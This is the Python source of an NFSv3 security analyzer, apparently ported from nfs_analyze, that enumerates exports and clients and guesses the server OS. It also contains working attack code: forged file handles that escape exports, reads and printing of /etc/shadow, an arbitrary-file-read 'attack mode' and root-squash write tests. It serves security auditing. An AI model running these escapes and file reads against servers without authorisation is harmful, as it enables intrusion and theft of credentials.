#!/usr/bin/env python3
#
# NFSv3 security analyzer for anfs.
#
# This is an async re-implementation of the NFSv3-relevant checks from
# hvs-consulting's nfs_analyze tool (https://github.com/hvs-consulting/nfs-security-tooling),
# built on top of anfs' Portmap / Mount / NFSv3Client primitives.
#
# Checks implemented:
#   - Portmap service/version summary and warnings
#   - Mount export enumeration (allowed clients, auth flavors, export file handles)
#   - Connected clients (mountd DUMP)
#   - Export escape via crafted file handles (ext/xfs + btrfs)
#   - /etc/shadow read attempt (no_root_squash / shadow-group GID / world readable)
#   - no_root_squash check (WRITES a test directory to the server; opt-in)
#   - Windows file handle signing check
#   - Server OS guessing
#
# NFSv4 specific checks from the original tool are out of scope (anfs is v3-only).
import io
import json
import asyncio
import logging
import binascii
import datetime
import traceback
from pathlib import PurePosixPath

from anfs.protocol.nfs3.common.factory import NFS3ConnectionFactory
from anfs.protocol.rpc.messages import AUTH_SYS
from anfs.protocol.rpc.common.exceptions import RPCReplyDeniedException, RPCCallRejectedException
from anfs.protocol.nfs3.messages import (
	NFS3_OK, NFS3ERR_ROFS, NFS3ERR_ACCES, NFS3ERR_EXIST, NFSSTAT3,
)
import anfs.protocol.mount.messages as mountconst

logger = logging.getLogger(__name__)


class JSONStatus:
	OK = "ok"
	SKIPPED = "skipped"
	UNKNOWN = "unknown"
	ERROR = "error"
	VULNERABLE = "vulnerable"


class FileID:
	root = "root"
	ext = "ext/xfs"
	btrfs = "btrfs"
	udf = "udf"
	nilfs = "nilfs"
	fat = "fat"
	lustre = "lustre"
	kernfs = "kernfs"
	invalid = "invalid"
	unknown = "unknown"


# Maps the file system identifier byte (offset 3 of a Linux knfsd file handle)
# to the on-disk file system family.
fileid_types = {
	0: FileID.root,
	1: FileID.ext,
	2: FileID.ext,
	0x81: FileID.ext,
	0x4d: FileID.btrfs,
	0x4e: FileID.btrfs,
	0x4f: FileID.btrfs,
	0x51: FileID.udf,
	0x52: FileID.udf,
	0x61: FileID.nilfs,
	0x62: FileID.nilfs,
	0x71: FileID.fat,
	0x72: FileID.fat,
	0x97: FileID.lustre,
	0xfe: FileID.kernfs,
	0xff: FileID.invalid,
}

# Length (in bytes) of the fsid embedded in a Linux knfsd file handle, by fsid type.
fsid_lens = {
	0: 8,
	1: 4,
	2: 12,
	3: 8,
	4: 8,
	5: 8,
	6: 16,
	7: 24,
}

# RPC program numbers as reported by portmap.
PMAP_PROTOCOL_NUMBERS = {
	100000: "portmap",
	100005: "mountd",
	100003: "nfs",
	100011: "rquota",
	100021: "nfs lock manager",
	100024: "status monitor 2",
	100133: "nsm_addr",
	100227: "nfs acl",
	400010: "netapp partner",
	400122: "localio",
	1073741824: "nfs4cbd (HP-UX)",
}

AUTH_FLAVOR_NAMES = {
	0: "none",
	1: "sys",
	3: "dh",
	390003: "krb5",
	390004: "krb5i",
	390005: "krb5p",
}


def pmap_num_to_str(prog):
	return PMAP_PROTOCOL_NUMBERS.get(prog, "Unknown service %s" % prog)


def auth_flavor_to_str(flavor):
	return AUTH_FLAVOR_NAMES.get(flavor, str(flavor))


# --------------------------------------------------------------------------- #
# Colored / plain output helpers
# --------------------------------------------------------------------------- #
class Coloring:
	def __init__(self, enabled=True):
		self.enabled = enabled
		self.OK = ""
		self.WARN = ""
		self.ERROR = ""
		self.RESET = ""
		if enabled:
			try:
				import colorama
				colorama.just_fix_windows_console()
				self.OK = colorama.Fore.GREEN
				self.WARN = colorama.Fore.YELLOW
				self.ERROR = colorama.Fore.RED
				self.RESET = colorama.Style.RESET_ALL
			except Exception:
				self.enabled = False

	def _wrap(self, text, color):
		if not self.enabled:
			return text
		return "%s%s%s" % (color, text, self.RESET)

	def ok(self, text):
		return self._wrap(text, self.OK)

	def warn(self, text):
		return self._wrap(text, self.WARN)

	def error(self, text):
		return self._wrap(text, self.ERROR)


def printable_len(string):
	length = 0
	escape_sequence = False
	for c in string:
		if not escape_sequence:
			if c == "\033":
				escape_sequence = True
			else:
				length += 1
		else:
			if c == "m":
				escape_sequence = False
	return length


def format_table(rows):
	if len(rows) <= 1:
		return "[empty]"
	columns = len(rows[0])
	max_lens = [0] * columns
	for row in rows:
		for i in range(columns):
			max_lens[i] = max(max_lens[i], printable_len(str(row[i])))
	lines = []
	for row in rows:
		parts = []
		for i in range(columns):
			cell = str(row[i])
			parts.append(cell + " " * (max_lens[i] - printable_len(cell)))
		lines.append(" ".join(parts).rstrip())
	return "\n".join(lines)


def make_cred(uid, gid, gids=None, machinename="anfs", stamp=None):
	if gids is None:
		gids = [gid]
	return AUTH_SYS(uid=uid, gid=gid, gids=gids, machinename=machinename, stamp=stamp)


# --------------------------------------------------------------------------- #
# Result model
# --------------------------------------------------------------------------- #
def _empty_export_entry():
	return {
		"allowed_clients": [],
		"mount_result": JSONStatus.UNKNOWN,
		"auth_methods": None,
		"file_handle": "",
		"clients": [],
		"escape": {
			"status": JSONStatus.UNKNOWN,
			"reason": "",
			"fstype": FileID.unknown,
			"parent_inode": None,
			"root_fh": None,
			"root_dir": None,
			"etc_shadow": {"status": JSONStatus.UNKNOWN, "reason": "", "content": None},
			"symlink_escape": {"status": JSONStatus.UNKNOWN, "reason": "", "directory": None},
			"read_file": {"status": JSONStatus.SKIPPED, "reason": "", "path": None, "content": None, "size": 0},
		},
		"no_root_squash": {"status": JSONStatus.SKIPPED, "reason": ""},
	}


def default_report():
	return {
		"target": "",
		"date": "",
		"portmap": {"status": JSONStatus.UNKNOWN, "reason": "", "services": {}, "raw": []},
		"exports": {"status": JSONStatus.UNKNOWN, "reason": "", "directories": {}},
		"invalid_exports": {},
		"connected_clients": [],
		"windows_handle_signing": {"status": JSONStatus.UNKNOWN, "reason": ""},
		"os": {"final_guess": JSONStatus.UNKNOWN, "checks": {}},
	}


# --------------------------------------------------------------------------- #
# Analyzer
# --------------------------------------------------------------------------- #
class NFS3Analyzer:
	def __init__(self, factory: NFS3ConnectionFactory, check_no_root_squash=False,
				btrfs_subvolumes=16, do_ping=False, charset="utf-8", colors=None,
				verbose_errors=False, quiet=False, read_file_path=None,
				read_file_max_size=None):
		self.factory = factory
		self.check_norootsquash = check_no_root_squash
		self.btrfs_subvolumes = btrfs_subvolumes
		# When set, every successfully escaped export additionally attempts to read
		# this path (interpreted from the escaped filesystem root) into the report.
		# This powers the arbitrary-file-read attack; the vuln scanner leaves it None
		# and only reads the fixed /etc/shadow proof file.
		self.read_file_path = read_file_path
		self.read_file_max_size = read_file_max_size
		self.do_ping = do_ping
		self.charset = charset
		self.colors = colors if colors is not None else Coloring(False)
		self.verbose_errors = verbose_errors
		# When quiet, the analyzer only fills self.report (used by the scanners)
		# and does not print a human readable report to stdout.
		self.quiet = quiet

		self.report = default_report()
		# directory(str) -> (file_handle_bytes_or_None, auth_sys_bool)
		self.mount_results = {}
		self._ping_cache = {}
		self._lines = []

	def _decode(self, data):
		if isinstance(data, (bytes, bytearray)):
			return bytes(data).decode(self.charset, errors="replace")
		return data

	def _out(self, text=""):
		self._lines.append(text)
		if not self.quiet:
			print(text)

	# ----------------------------------------------------------------- #
	# Portmap
	# ----------------------------------------------------------------- #
	async def check_portmap(self):
		portmap = self.factory.get_portmap()
		_, err = await portmap.connect()
		if err is not None:
			self.report["portmap"]["status"] = JSONStatus.ERROR
			self.report["portmap"]["reason"] = str(err)
			self._out(self.colors.error("Could not connect to portmap: %s" % err))
			return None
		try:
			mappings, err = await portmap.dump()
			if err is not None:
				raise err
		except Exception as e:
			self.report["portmap"]["status"] = JSONStatus.ERROR
			self.report["portmap"]["reason"] = str(e)
			self._out(self.colors.error("Error requesting portmap listing: %s" % e))
			await portmap.disconnect()
			return None
		await portmap.disconnect()

		services = {}
		for m in mappings:
			services.setdefault(m.program, set()).add(m.version)

		self._out("Supported protocol versions reported by portmap:")
		data = [("Protocol", "Versions")]
		for prog in services:
			data.append((pmap_num_to_str(prog), ", ".join(str(v) for v in sorted(services[prog]))))
		self._out(format_table(data))

		self.report["portmap"]["status"] = JSONStatus.OK
		self.report["portmap"]["services"] = {
			pmap_num_to_str(prog): sorted(services[prog]) for prog in services
		}
		self.report["portmap"]["raw"] = [
			{"program": m.program, "version": m.version, "protocol": m.protocol, "port": m.port}
			for m in mappings
		]

		self._portmap_warnings(services)
		return mappings

	def _portmap_warnings(self, services):
		def supports(prog, vers=None):
			if prog not in services:
				return False
			if vers is None:
				return True
			return vers in services[prog]

		if not supports(100003):
			self._out(self.colors.error("Server does not support nfs"))
		elif not supports(100003, 3) and not supports(100003, 4):
			self._out(self.colors.error("Server only supports old NFS versions, this tool only supports v3"))
		elif not supports(100003, 3):
			self._out(self.colors.warn("Server does not support NFSv3 (this tool only checks v3)"))

		if not supports(100005):
			self._out(self.colors.error("Server does not support mountd"))
		elif not supports(100005, 3):
			self._out(self.colors.error("Server only supports old mountd versions, this tool only supports v3"))

	# ----------------------------------------------------------------- #
	# Host classification for allowed clients
	# ----------------------------------------------------------------- #
	async def _ping_host(self, host):
		if host in self._ping_cache:
			return self._ping_cache[host]
		if "%" in host:
			host = host.split("%")[0]
		result = False
		try:
			proc = await asyncio.create_subprocess_exec(
				"ping", "-c", "1", "-W", "1", host,
				stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
			rc = await proc.wait()
			result = rc == 0
		except Exception:
			result = False
		self._ping_cache[host] = result
		return result

	async def classify_host(self, host):
		"""Returns (json_info_dict, display_label)."""
		if host == "*":
			return {"name": host, "type": "wildcard", "status": JSONStatus.UNKNOWN}, self.colors.error("(wildcard)")
		if "*" in host or "?" in host or "[" in host:
			return {"name": host, "type": "wildcard", "status": JSONStatus.UNKNOWN}, self.colors.warn("(wildcard)")
		if "/" in host:
			return {"name": host, "type": "subnet", "status": JSONStatus.UNKNOWN}, self.colors.warn("(subnet)")
		if "@" in host:
			return {"name": host, "type": "netgroup", "status": JSONStatus.UNKNOWN}, "(netgroup)"
		if host.endswith(".0"):
			return {"name": host, "type": "subnet_freebsd", "status": JSONStatus.UNKNOWN}, self.colors.error("(subnet FreeBSD)")
		if self.do_ping:
			is_up = await self._ping_host(host)
			if is_up:
				return {"name": host, "type": "host", "status": "up"}, self.colors.ok("(up)")
			return {"name": host, "type": "host", "status": "down"}, self.colors.error("(down)")
		return {"name": host, "type": "host", "status": JSONStatus.UNKNOWN}, ""

	# ----------------------------------------------------------------- #
	# Exports
	# ----------------------------------------------------------------- #
	async def enumerate_exports(self, mount):
		try:
			exports, err = await mount.export()
			if err is not None:
				raise err
		except Exception as e:
			self.report["exports"]["status"] = JSONStatus.ERROR
			self.report["exports"]["reason"] = str(e)
			self._out(self.colors.error("Error requesting exports: %s" % e))
			return

		self.report["exports"]["status"] = JSONStatus.OK
		data = [("Directory", "Allowed clients", "Auth methods", "Export file handle")]

		for export in exports:
			directory = export.filesys
			groups = []
			client_infos = []
			for group in export.groups:
				info, label = await self.classify_host(group)
				groups.append(group + label)
				client_infos.append(info)
			group_text = ", ".join(groups) if groups else self.colors.error("(everyone)")

			auth_methods_text = ""
			file_handle_text = ""
			auth_methods_json = None
			mount_status_text = mountconst.MOUNTSTAT3.get(mountconst.MNT3_OK, "MNT3_OK")
			fh = None
			auth_sys = False

			res, err = await mount.mnt(directory)
			if err is not None or res is None:
				auth_methods_text = "No response received"
				mount_status_text = "no_response"
			else:
				mount_status_text = mountconst.MOUNTSTAT3.get(res.status, str(res.status))
				if res.status == mountconst.MNT3_OK:
					fh = res.fhandle
					auth_methods_json = [auth_flavor_to_str(a) for a in res.auth_flavors]
					auth_methods_text = ", ".join(self._auth_label(a) for a in res.auth_flavors)
					auth_sys = 1 in res.auth_flavors
					if fh:
						file_handle_text = binascii.hexlify(fh).decode()
				elif res.status == mountconst.MNT3ERR_ACCES:
					auth_methods_text = "Access denied"
				else:
					auth_methods_text = "mount failed: %s" % mount_status_text

			self.mount_results[directory] = (fh, auth_sys)
			data.append((directory, group_text, auth_methods_text, file_handle_text))
			self.report["exports"]["directories"][directory] = _empty_export_entry()
			entry = self.report["exports"]["directories"][directory]
			entry["allowed_clients"] = client_infos
			entry["mount_result"] = mount_status_text
			entry["auth_methods"] = auth_methods_json
			entry["file_handle"] = file_handle_text

		self._out("Available exports reported by mountd:")
		self._out(format_table(data))

	def _auth_label(self, flavor):
		name = auth_flavor_to_str(flavor)
		if flavor in (0, 1, 3):
			return self.colors.error(name)
		if flavor == 390003:
			return self.colors.warn(name)
		if flavor == 390005:
			return self.colors.ok(name)
		return name

	async def enumerate_clients(self, mount):
		try:
			clients, err = await mount.dump()
			if err is not None:
				raise err
		except Exception as e:
			self._out(self.colors.error("Error getting list of connected clients: %s" % e))
			return
		if not clients:
			return

		data = [("Client", "Export")]
		for entry in clients:
			hostname = entry.hostname
			directory = entry.directory
			info, label = await self.classify_host(hostname)
			data.append((hostname + label, directory))
			self.report["connected_clients"].append({"hostname": hostname, "directory": directory, **info})
			if directory in self.report["exports"]["directories"]:
				self.report["exports"]["directories"][directory]["clients"].append(info)
			else:
				self.report["invalid_exports"].setdefault(directory, []).append(info)

		self._out("")
		self._out("Connected clients reported by mountd:")
		self._out(format_table(data))

	# ----------------------------------------------------------------- #
	# Windows file handle signing
	# ----------------------------------------------------------------- #
	def check_windows_signing(self):
		entry = self.report["windows_handle_signing"]
		for fh, _auth in self.mount_results.values():
			if fh is None:
				continue
			if len(fh) != 32:
				entry["status"] = JSONStatus.OK
				entry["reason"] = "not_windows"
				self._out(self.colors.ok("NFSv3 Windows File Handle Signing: OK") +
						", server probably not Windows (file handle not 32 bytes)")
				return
			if fh[-10:] == b"\x00" * 10:
				entry["status"] = JSONStatus.VULNERABLE
				entry["reason"] = "disabled"
				self._out("NFSv3 Windows File Handle Signing: " +
						self.colors.error("DISABLED (arbitrary access possible)"))
				return
			entry["status"] = JSONStatus.OK
			entry["reason"] = "enabled"
			self._out("NFSv3 Windows File Handle Signing: " + self.colors.ok("Enabled"))
			return
		entry["status"] = JSONStatus.UNKNOWN
		entry["reason"] = "no_suitable_export"
		self._out("NFSv3 Windows File Handle Signing: testing not possible, no export available")

	# ----------------------------------------------------------------- #
	# Export escape
	# ----------------------------------------------------------------- #
	async def try_escape(self, nfs):
		self._out("")
		self._out("Trying to escape exports")
		unpriv = make_cred(1000, 1000, gids=[1001, 1002])
		for directory, (export_fh, _auth) in self.mount_results.items():
			json_entry = self.report["exports"]["directories"][directory]["escape"]
			if export_fh is None:
				json_entry["status"] = JSONStatus.ERROR
				json_entry["reason"] = "mount_failed"
				continue

			export_fh = bytearray(export_fh)
			if len(export_fh) < 5 or export_fh[0] != 1:
				self._out(self.colors.ok("Escape failed") +
						", unknown file handle type, server probably not Linux")
				json_entry["status"] = JSONStatus.OK
				json_entry["reason"] = "not_linux"
				return

			filesystem = FileID.unknown
			export_dir, status = await nfs.readdirplus_raw(bytes(export_fh), cred=unpriv)
			if not isinstance(export_dir, list):
				export_dir = []
			parent_fileid = None
			export_fileid = None
			for entry in export_dir:
				if entry.name == b".":
					export_fileid = entry.fileid
				if entry.name == b"..":
					parent_fileid = entry.fileid
				elif filesystem == FileID.unknown and entry.name != b"." and entry.filehandle is not None:
					if len(entry.filehandle) >= 5:
						fh_fileid = entry.filehandle[3]
						if fh_fileid in fileid_types:
							filesystem = fileid_types[fh_fileid]

			self._out("Export %s: file system type %s, parent inode %s" % (directory, filesystem, parent_fileid))
			json_entry["fstype"] = filesystem
			json_entry["parent_inode"] = parent_fileid

			fsid_type = export_fh[2]
			if fsid_type not in fsid_lens:
				self._out("Unsupported fsid type %s" % fsid_type)
				json_entry["status"] = JSONStatus.ERROR
				json_entry["reason"] = "unsupported_fsid"
				continue
			fsid_len = fsid_lens[fsid_type]
			root_fh = export_fh.copy()

			if filesystem in (FileID.ext, FileID.unknown):
				if export_fileid in [2, 128]:
					self._out(self.colors.ok("Escape failed, export is root of filesystem"))
					json_entry["status"] = JSONStatus.OK
					json_entry["reason"] = "export_is_root"
					continue

				root_fh[3] = 2
				root_fh[4 + fsid_len:] = [0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
										  0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]
				if await self._check_escape(nfs, root_fh, export_fh, directory, json_entry, unpriv):
					continue

				root_fh[3] = 2
				root_fh[4 + fsid_len:] = [128, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
										  128, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]
				if await self._check_escape(nfs, root_fh, export_fh, directory, json_entry, unpriv):
					continue

			if filesystem in (FileID.btrfs, FileID.unknown):
				escape_success = False
				for i in range(self.btrfs_subvolumes):
					root_fh[3] = 0x4d
					root_fh[4 + fsid_len:] = [0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
											  i, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
											  0x00, 0x00, 0x00, 0x00]
					if await self._check_escape(nfs, root_fh, export_fh, directory, json_entry, unpriv, i + 256):
						escape_success = True
				if escape_success:
					continue

			if json_entry["status"] != JSONStatus.VULNERABLE:
				self._out(self.colors.ok("Escape failed"))

	async def _check_escape(self, nfs, root_fh, export_fh, directory, json_entry, cred, btrfs_subvolume_id=None):
		entries, status = await nfs.readdirplus_raw(bytes(root_fh), cred=cred)
		if isinstance(entries, list) and len(entries) > 0 and status == NFS3_OK:
			dir_list = [self._decode(e.name) for e in entries]
			if btrfs_subvolume_id is None:
				self._out(self.colors.error("Escape successful, root directory listing:"))
			else:
				self._out(self.colors.error("Escape successful, root directory listing of subvolume %s:" % btrfs_subvolume_id))
			self._out(self.colors.error(" ".join(dir_list)))
			self._out(self.colors.error("Root file handle: %s" % binascii.hexlify(bytes(root_fh)).decode()))

			json_entry["status"] = JSONStatus.VULNERABLE
			if btrfs_subvolume_id is None:
				json_entry["root_fh"] = binascii.hexlify(bytes(root_fh)).decode()
				json_entry["root_dir"] = dir_list
			else:
				if not json_entry.get("root_fh"):
					json_entry["root_fh"] = "BTRFS subvolumes:"
					json_entry["root_dir"] = "BTRFS subvolumes:"
				json_entry["root_fh"] += "\n%s: %s" % (btrfs_subvolume_id, binascii.hexlify(bytes(root_fh)).decode())
				json_entry["root_dir"] += "\n%s: %s" % (btrfs_subvolume_id, dir_list)

			await self.read_etc_shadow(nfs, root_fh, json_entry["etc_shadow"])
			await self.check_root_permissions(nfs, root_fh, directory, json_entry["symlink_escape"])
			# Optional operator-driven arbitrary file read (attack mode). Don't
			# overwrite a successful read from an earlier BTRFS subvolume.
			if self.read_file_path and json_entry["read_file"]["status"] != JSONStatus.VULNERABLE:
				await self.read_file_from_root(nfs, root_fh, self.read_file_path, json_entry["read_file"])
			return True
		else:
			if json_entry["status"] != JSONStatus.VULNERABLE:
				json_entry["status"] = JSONStatus.OK
		return False

	# ----------------------------------------------------------------- #
	# /etc/shadow
	# ----------------------------------------------------------------- #
	async def read_etc_shadow(self, nfs, root_fh, json_entry):
		unpriv = make_cred(1000, 1000, gids=[1001, 1002])
		etc_res, err = await nfs.lookup_raw(bytes(root_fh), b"etc", cred=unpriv)
		if err is not None or etc_res is None or etc_res.status != NFS3_OK:
			# The escaped filesystem root has no /etc (e.g. the export lives on a
			# data-only volume). Not reachable here, but report it explicitly so
			# the result is not left as an empty "unknown".
			json_entry["status"] = JSONStatus.OK
			json_entry["reason"] = "no_etc_in_filesystem_root"
			return
		etc_fh = etc_res.resok.object.data

		shadow_res, err = await nfs.lookup_raw(etc_fh, b"shadow", cred=unpriv)
		if err is not None or shadow_res is None or shadow_res.status != NFS3_OK:
			json_entry["status"] = JSONStatus.OK
			json_entry["reason"] = "file_not_found"
			return
		shadow_fh = shadow_res.resok.object.data

		# 1) world readable as an unprivileged user
		status, data, err = await nfs.read_entire_raw(shadow_fh, cred=unpriv)
		if err is None and status == NFS3_OK:
			content = self._decode(data)
			self._out(self.colors.error("File /etc/shadow readable by unprivileged user"))
			self._out(self.colors.error(content))
			json_entry["status"] = JSONStatus.VULNERABLE
			json_entry["reason"] = "wrong_permissions"
			json_entry["content"] = content
			return

		# Determine the shadow group gid
		gid = None
		ga, err = await nfs.getattr_raw(shadow_fh, cred=unpriv)
		if err is None and ga is not None and ga.status == NFS3_OK and ga.attributes is not None:
			gid = ga.attributes.gid

		# 2) no_root_squash (read as root)
		root_cred = make_cred(0, 0, gids=[0])
		status, data, err = await nfs.read_entire_raw(shadow_fh, cred=root_cred)
		if err is None and status == NFS3_OK:
			content = self._decode(data)
			self._out(self.colors.error("no_root_squash ENABLED, FULL ROOT ACCESS TO SYSTEM"))
			self._out(self.colors.error("Content of /etc/shadow:"))
			self._out(self.colors.error(content))
			json_entry["status"] = JSONStatus.VULNERABLE
			json_entry["reason"] = "no_root_squash"
			json_entry["content"] = content
			return

		# 3) shadow group readable
		if gid is not None and gid != 0:
			grp_cred = make_cred(1000, gid, gids=[gid, 1001, 1002])
			status, data, err = await nfs.read_entire_raw(shadow_fh, cred=grp_cred)
			if err is None and status == NFS3_OK:
				content = self._decode(data)
				self._out(self.colors.error("GID of shadow group: %s" % gid))
				self._out(self.colors.error("Content of /etc/shadow:"))
				self._out(self.colors.error(content))
				json_entry["status"] = JSONStatus.VULNERABLE
				json_entry["reason"] = "shadow_group %s" % gid
				json_entry["content"] = content
				return

		if json_entry["status"] != JSONStatus.VULNERABLE:
			json_entry["status"] = JSONStatus.OK
			json_entry["reason"] = "not_readable"

	# ----------------------------------------------------------------- #
	# Arbitrary file read from the escaped filesystem root (attack)
	# ----------------------------------------------------------------- #
	async def read_file_from_root(self, nfs, root_fh, posix_path, json_entry, max_size=None):
		"""Read an arbitrary file located at `posix_path` interpreted from the
		escaped filesystem root and store its bytes in `json_entry`.

		This is the generic counterpart to read_etc_shadow: it walks the path
		component by component and tries to read the file as root first (to
		leverage no_root_squash) and then as an unprivileged user (world
		readable). `json_entry` is the per-export "read_file" sub-object.
		"""
		json_entry["path"] = posix_path
		if max_size is None:
			max_size = self.read_file_max_size

		parts = [p for p in PurePosixPath(posix_path).parts if p not in ("", "/")]
		if not parts:
			json_entry["status"] = JSONStatus.ERROR
			json_entry["reason"] = "empty_path"
			return

		# Each credential gets its own full walk+read: directory traversal
		# permissions differ per identity (e.g. a 0700 root-owned parent is only
		# traversable as root when no_root_squash is on).
		attempts = [
			("root", make_cred(0, 0, gids=[0])),
			("unprivileged", make_cred(1000, 1000, gids=[1001, 1002])),
		]

		last_reason = "not_readable"
		for label, cred in attempts:
			current_fh = bytes(root_fh)
			missing = None
			for component in parts:
				res, err = await nfs.lookup_raw(current_fh, component.encode(self.charset), cred=cred)
				if err is not None or res is None or res.status != NFS3_OK:
					missing = component
					break
				current_fh = res.resok.object.data
			if missing is not None:
				last_reason = "path_not_found"
				json_entry["missing_component"] = missing
				continue

			status, data, err = await nfs.read_entire_raw(current_fh, cred=cred, max_size=max_size)
			if err is None and status == NFS3_OK:
				content = self._decode(data)
				self._out(self.colors.error("Read %s as %s (%s bytes)" % (
					posix_path, label, len(data) if data is not None else 0)))
				json_entry["status"] = JSONStatus.VULNERABLE
				json_entry["reason"] = "read_as_%s" % label
				json_entry["content"] = content
				json_entry["size"] = len(data) if data is not None else 0
				json_entry.pop("missing_component", None)
				return
			last_reason = "not_readable"

		json_entry["status"] = JSONStatus.OK
		json_entry["reason"] = last_reason

	# ----------------------------------------------------------------- #
	# Symlink escape (writable parent directory of a path component)
	# ----------------------------------------------------------------- #
	async def check_root_permissions(self, nfs, root_fh, export_path, json_entry):
		unpriv = make_cred(1000, 1000, gids=[1001, 1002])
		parts = list(PurePosixPath(export_path).parts)
		current_fh = bytes(root_fh)
		for directory in parts[1:]:
			res, err = await nfs.lookup_raw(current_fh, directory.encode(self.charset), cred=unpriv)
			if err is not None or res is None or res.status != NFS3_OK:
				continue
			current_fh = res.resok.object.data
			dir_attrs = res.resok.dir_attributes
			if dir_attrs is None or not dir_attrs.present:
				continue
			attrs = dir_attrs.attributes
			if attrs.uid != 0 or attrs.gid != 0 or (attrs.mode & 0o2) != 0:
				self._out(self.colors.error(
					"Full escape might be possible: path component '%s' has a writable parent "
					"directory and can be replaced with a symlink" % directory))
				json_entry["status"] = JSONStatus.VULNERABLE
				json_entry["reason"] = "writable_parent_directory"
				json_entry["directory"] = directory
				return
		if json_entry["status"] != JSONStatus.VULNERABLE:
			json_entry["status"] = JSONStatus.OK
			json_entry["reason"] = "correct_permissions"

	# ----------------------------------------------------------------- #
	# no_root_squash (writes to the server)
	# ----------------------------------------------------------------- #
	async def check_no_root_squash(self, nfs):
		self._out("")
		self._out("Checking no_root_squash " + self.colors.warn("(this writes a test directory to the server)"))
		test_dir = b"nfs_analyze_test"
		root_cred = make_cred(0, 0, gids=[0])
		data = [("Export", "no_root_squash")]
		for directory, (fh, auth_sys) in self.mount_results.items():
			if fh is None:
				continue
			json_entry = self.report["exports"]["directories"][directory]["no_root_squash"]
			json_entry["status"] = JSONStatus.UNKNOWN
			status_text = ""

			if not auth_sys:
				status_text = self.colors.ok("AUTH_SYS not supported") + " (no_root_squash status unknown)"
				json_entry["reason"] = "auth_sys_not_supported"
				data.append((directory, status_text))
				continue

			mkres, err = await nfs.mkdir_raw(fh, test_dir, uid=0, gid=0, mode=0o600, cred=root_cred)
			if err is not None:
				if isinstance(err, (RPCReplyDeniedException, RPCCallRejectedException)):
					json_entry["status"] = JSONStatus.OK
					json_entry["reason"] = "disabled"
					status_text = self.colors.ok("DISABLED")
				else:
					json_entry["status"] = JSONStatus.ERROR
					json_entry["reason"] = str(err)
					status_text = self.colors.error("ERROR: %s" % err)
				data.append((directory, status_text))
				continue

			if mkres.status == NFS3_OK:
				status_text = self.colors.warn("UNKNOWN")
				obj_attrs = mkres.resok.obj_attributes
				if obj_attrs is not None and obj_attrs.present:
					if obj_attrs.attributes.uid == 0:
						json_entry["status"] = JSONStatus.VULNERABLE
						json_entry["reason"] = "enabled"
						status_text = self.colors.error("ENABLED (privilege escalation on client possible)")
					else:
						json_entry["status"] = JSONStatus.OK
						json_entry["reason"] = "disabled"
						status_text = self.colors.ok("DISABLED")
				rmres, _ = await nfs.rmdir_raw(fh, test_dir, cred=root_cred)
				if rmres is None or rmres.status != NFS3_OK:
					json_entry["status"] = JSONStatus.ERROR
					json_entry["reason"] = "could_not_delete_test_directory"
					status_text += self.colors.error(
						" Could not delete test directory, please remove %s/%s manually" % (directory, test_dir.decode()))
			elif mkres.status == NFS3ERR_ROFS:
				json_entry["status"] = JSONStatus.UNKNOWN
				json_entry["reason"] = "readonly"
				status_text = self.colors.ok("READONLY") + " (no_root_squash status unknown)"
			elif mkres.status == NFS3ERR_ACCES:
				json_entry["status"] = JSONStatus.OK
				json_entry["reason"] = "disabled"
				status_text = self.colors.ok("DISABLED")
			elif mkres.status == NFS3ERR_EXIST:
				json_entry["status"] = JSONStatus.ERROR
				json_entry["reason"] = "test_directory_exists"
				status_text = self.colors.error("Test directory from a previous run exists")
				rmres, _ = await nfs.rmdir_raw(fh, test_dir, cred=root_cred)
				if rmres is None or rmres.status != NFS3_OK:
					status_text += self.colors.error(
						" Could not delete it, please remove %s/%s manually" % (directory, test_dir.decode()))
					json_entry["reason"] = "could_not_delete_test_directory"
				else:
					status_text += " Successfully deleted test directory"
			else:
				status_text = "mkdir failed: %s" % NFSSTAT3.get(mkres.status, mkres.status)
				json_entry["reason"] = NFSSTAT3.get(mkres.status, str(mkres.status))

			data.append((directory, status_text))

		self._out(format_table(data))

	# ----------------------------------------------------------------- #
	# OS guess
	# ----------------------------------------------------------------- #
	def guess_os(self):
		netapp_service = None
		if self.report["portmap"]["status"] == JSONStatus.OK:
			netapp_service = "netapp partner" in self.report["portmap"]["services"]

		linux_fh_0100 = None
		windows_fh_32 = None
		freebsd_subnet = None
		directories = self.report["exports"]["directories"]
		if self.report["exports"]["status"] == JSONStatus.OK and directories:
			linux_fh_0100 = True
			windows_fh_32 = True
			valid_export = False
			has_normal_subnet = False
			has_freebsd_subnet = False
			for export in directories.values():
				fh = export.get("file_handle") or ""
				if fh:
					valid_export = True
					linux_fh_0100 &= (fh[0:4] == "0100")
					windows_fh_32 &= (len(fh) == 64)
				for client in export.get("allowed_clients", []):
					valid_export = True
					has_normal_subnet |= (client["type"] == "subnet")
					has_freebsd_subnet |= (client["type"] == "subnet_freebsd")
			if has_normal_subnet and not has_freebsd_subnet:
				freebsd_subnet = False
			elif has_freebsd_subnet and not has_normal_subnet:
				freebsd_subnet = True
			if not valid_export:
				linux_fh_0100 = None
				windows_fh_32 = None
				freebsd_subnet = None

		# NFSv4-dependent signals are not available in a v3-only tool.
		windows_versions = None
		hpux_resetting = None

		texts = {
			None: self.colors.warn("Unknown"),
			True: self.colors.ok("Yes"),
			False: self.colors.error("No"),
		}
		self._out("")
		self._out("Trying to guess server OS")
		output = [
			("OS", "Property", "Fulfilled"),
			("Linux", "File handles start with 0x0100", texts[linux_fh_0100]),
			("Windows", "NFSv3 file handles are 32 bytes long", texts[windows_fh_32]),
			("FreeBSD", "Mountd reports subnets without mask", texts[freebsd_subnet]),
			("NetApp", "netapp partner protocol supported", texts[netapp_service]),
		]
		self._out(format_table(output))

		final_guess = "Unknown"
		if netapp_service:
			final_guess = "NetApp"
		elif windows_fh_32:
			final_guess = "Windows"
		elif freebsd_subnet:
			final_guess = "FreeBSD"
		elif linux_fh_0100:
			final_guess = "Linux"
		self._out("")
		self._out("Final OS guess: %s" % final_guess)

		self.report["os"]["final_guess"] = final_guess
		self.report["os"]["checks"] = {
			"linux_fh_0100": linux_fh_0100,
			"windows_fh_32": windows_fh_32,
			"windows_versions": windows_versions,
			"freebsd_subnet": freebsd_subnet,
			"netapp_service": netapp_service,
			"hpux_resetting": hpux_resetting,
		}

	# ----------------------------------------------------------------- #
